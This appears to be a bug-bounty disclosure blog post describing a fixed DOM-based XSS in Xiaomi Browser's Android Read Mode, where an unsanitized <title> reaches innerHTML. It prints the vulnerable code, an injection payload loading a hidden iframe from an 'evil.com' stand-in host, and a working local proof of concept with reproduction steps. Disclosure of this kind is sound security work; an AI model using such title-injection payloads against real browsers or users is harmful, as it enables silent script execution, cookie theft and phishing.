---
date: "2025-11-16T23:22:28+08:00"
draft: false
title: "DOM-Based JavaScript Execution in Xiaomi Browser Reader Mode via <title> HTML Injection (Android)"
summary: "A DOM-based Cross-Site Scripting (XSS) vulnerability was discovered in Xiaomi Browser’s Read Mode due to insufficient sanitization of the HTML <title> tag, allowing arbitrary HTML or JavaScript to be executed via innerHTML."

showToc: false
TocOpen: false
hidemeta: false
comments: false
disableHLJS: true
disableShare: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: false
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
markup: goldmark
goldmark:
  renderer:
    unsafe: true
---

### **Summary**

A DOM-based Cross-Site Scripting (XSS) vulnerability was discovered in Xiaomi Browser’s Read Mode due to insufficient sanitization of the HTML <title> tag, allowing arbitrary HTML or JavaScript to be executed via innerHTML.

Although the article body is processed and sanitized before rendering, the **document title is passed through `processTitle()`** and then **injected directly** into the Read Mode page via JavaScript using `setTitle(titleHTML)` **without any escaping or HTML sanitization**.

This allows an attacker to embed **malicious `<iframe>`**, `<script>`, or any executable HTML directly in the `<title>` tag, which executes **invisibly** when Read Mode is activated, even if the body appears clean and safe.


### **Root Cause Analysis**


The vulnerability exists in the **ReadModeController** class, which builds JavaScript commands to render content and title in the WebView:


#### **In ReadModeController.java**

```java
public void appendPage(String str, String str2, String str3, String str4) {
  this.mReadPages++;
  this.mNextUrl = str4;

  ReaderBrowserWebView readerBrowserWebView = this.mReaderView;
  if (readerBrowserWebView == null || readerBrowserWebView.isDestroyed()) {
    return;
  }

  if (Browser.getContext().getResources().getBoolean(R.bool.is_right_to_left)) {
    JavaScriptUtils.executeJSCode((BrowserWebView) this.mReaderView,
        "document.body.setAttribute(\"dir\", \"rtl\");");
  }

  String strProcessTitle = processTitle(
      str); // ← processTitle() does NOT sanitize HTML or escape scripts

  if (strProcessTitle != null
      && strProcessTitle.equalsIgnoreCase(this.mPriviousTitle)) {
    strProcessTitle = null;
  }
  this.mPriviousTitle = str;

  String str5 = "var contentHTML='" + processContent(str2)
      + "';appendPage();setContent(contentHTML);";

  if (strProcessTitle != null) {
    str5 = str5 + "var titleHTML='" + strProcessTitle
        + "';setTitle(titleHTML);"; // ← Raw title injected into JS string
                                    // → XSS via <iframe>, <script>,
  }

  if (this.mReadPages > 1) {
    this.mReadModeBookMarksManager.addNewPage(str, str3);
  }

  JavaScriptUtils.executeJSCode((BrowserWebView) this.mReaderView,
      str5); // ← Executes unsanitized JS  
             // → setTitle() uses innerHTML → DOM XSS

  if (str4 == null || str4.isEmpty()) {
    JavaScriptUtils.executeJSCode(
        (BrowserWebView) this.mReaderView, "hideLoading();");
  }
}
```

* Read Mode builds a JavaScript string containing both the sanitized content and the **raw title HTML**.
* `processTitle()` returns the `<title>` **without any sanitization**, leaving attacker‑supplied HTML intact.
* The raw title is concatenated into JS (`setTitle(titleHTML)`) and executed, where `innerHTML` **parses and runs the injected HTML**.
* This results in **DOM‑based XSS**, triggered automatically when Read Mode loads the page.

#### **In reading_mode_html_internal.js**
On the client side (`reading_mode_internal.js`):
```js
function setTitle(titleHTML){
    var title = document.getElementById("title" + pageNum);
    if (titleHTML.trim().length != 0) {
        title.setAttribute("class", "title");
        title.innerHTML = titleHTML;  // ← DOM-based XSS via innerHTML
    }
}
```
* `setTitle()` takes the `titleHTML` value and inserts it into the page using `innerHTML`, which tells the browser to interpret the content as real HTML. Because the title is never sanitized, any attacker‑supplied elements such as `<script>`, `<iframe>`, or `<img onerror>` are parsed and added directly to the DOM.
* This makes `setTitle()` the main XSS sink in Read Mode. When the feature loads, the injected HTML from the `<title>` tag executes automatically, allowing an attacker to run arbitrary JavaScript without any user interaction or visual indication.


### **Attack Flow**

```html
<title><iframe src="http://evil.com/malware.html" width="0" height="0"></title>
```

1. User opens a page with malicious `<title>`.
2. `ReadModeController.appendPage()` calls `processTitle(title)`.
3. JavaScript string is built:  
   ```js
   var titleHTML='<iframe src="http://evil.com/malware.html" ...></iframe>';
   ```
4. `setTitle(titleHTML)` executes → `innerHTML` renders the iframe.
5. **Iframe loads silently** and executes malware in Read Mode context.


### **Proof of Concept (PoC)**
#### `malware_frame.html`
```html
<html>
<head><title>Malware Payload</title></head>
<body>
<script>
    alert('XSS via Xiaomi Read Mode Title Iframe!');
    // Real attack: steal cookies, keylog, phishing overlay
</script>
</body>
</html>
```

#### `poc.html`
```html
<html>
<head>
  <title><iframe src="http://localhost:8080/malware_frame.html" height="0" width="0" frameborder="0"></title>
  <h1>Use Read Mode for better experience</h1>
</head>
<body>
  <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit...</p>
  <p>More dummy text to trigger Read Mode suggestion...</p>
</body>
</html>
```

### **Steps to Reproduce**
1. Start local server:
   ```bash
   python3 -m http.server 8080
   ```
   Place `poc.html` and `malware_frame.html` in the directory.
2. Open Xiaomi Browser on Android.
3. Navigate to:  
   `http://localhost:8080/poc.html`
4. Tap the Read Mode icon (book/page layout in address bar).
5. Observe:
   - `alert()` fires immediately** from the invisible iframe.

### **Disclosure Timeline**
* **April 30, 2021** — Report submitted on the HackerOne platform.
* **May 8, 2021** — Report triaged and acknowledged by the security team.
* **May 17, 2021** — Vulnerability fixed and bounty awarded.